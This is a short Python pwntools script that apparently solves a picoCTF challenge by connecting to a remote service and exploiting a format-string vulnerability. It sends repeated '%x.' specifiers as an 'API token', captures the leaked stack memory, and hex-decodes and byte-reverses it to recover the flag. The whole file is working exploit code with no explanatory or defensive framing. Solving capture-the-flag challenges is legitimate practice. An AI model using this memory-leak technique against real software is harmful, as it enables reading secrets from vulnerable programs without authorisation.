from pwn import remote

r = remote('mercury.picoctf.net', 16439)
print(r.recvuntil('2) View my portfolio\n').decode().strip())
r.send("1\n")
print(r.recvuntil("What is your API token?\n").decode())
r.sendline('%x.' * 59)
print(r.recvuntil("Buying stonks with token:\n").decode())
leak = r.recvline().decode("utf-8")
print(leak)
leak = leak.split('.')
flag = ""
for data in leak:
    try:
        # Try to print if it's decodable from hex to ascii
        data = bytes.fromhex(data).decode()[::-1]
        flag += data
    except:
        continue

print(flag)
